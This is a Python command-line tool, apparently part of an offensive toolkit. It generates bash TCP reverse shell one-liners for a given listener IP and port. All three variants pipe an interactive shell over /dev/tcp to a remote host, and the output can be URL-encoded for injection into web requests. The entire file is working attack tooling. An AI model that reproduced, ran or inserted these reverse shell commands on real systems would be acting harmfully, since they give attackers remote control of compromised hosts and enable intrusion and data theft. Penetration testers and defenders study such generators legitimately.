import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default=1, type=click.Choice(["1", "2", "3"]),
              help="Variant: 1=bash -i (default), 2=exec fd, 3=bash -l")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return bash TCP reverse shell"""
    if variant == "1":
        cmd = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
    elif variant == "2":
        cmd = f"0<&196;exec 196<>/dev/tcp/{listener_ip}/{listener_port}; sh <&196 >&196 2>&196"
    else:
        cmd = f"/bin/bash -l > /dev/tcp/{listener_ip}/{listener_port} 0<&1 2>&1"
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Bash TCP reverse shell (variant {variant}):\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
